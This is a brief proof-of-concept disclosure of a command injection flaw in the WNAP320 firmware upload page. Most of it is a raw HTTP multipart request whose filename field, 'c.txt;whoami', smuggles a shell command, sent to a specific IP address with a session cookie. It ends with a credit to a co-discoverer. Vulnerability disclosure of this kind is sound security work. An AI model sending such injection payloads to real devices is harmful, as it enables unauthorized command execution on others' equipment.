# PoC
WNAP320 has a command injection vulnerability in the function point of firmware upload and update 

parameter:filename

```
POST /index.php?page=master HTTP/1.1
Host: 114.132.41.25:8888
Content-Length: 984
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.132.41.25:8888
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnrNRbOrK9PcUtrm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://114.132.41.25:8888/index.php?page=master&menu1=Maintenance&menu2=Upgrade&menu3=Firmware%20Upgrade&menu4=
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
Cookie: PHPSESSID=9f2f70225c6218ce5fb8b39cd7433175
Connection: close

------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="menu1"

Maintenance
------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="menu2"

Upgrade
------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="menu3"

Firmware Upgrade
------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="menu4"

Firmware Upgrade
------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="mode7"


------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="mode8"


------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="mode9"


------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="Action"

apply
------WebKitFormBoundaryVnrNRbOrK9PcUtrm
Content-Disposition: form-data; name="firmwareFile"; filename="c.txt;whoami"
Content-Type: text/plain

123
------WebKitFormBoundaryVnrNRbOrK9PcUtrm--

```


#### Acknowledgement

Thanks to the partners who discovered the vulnerability together：

Yi-fei Gao
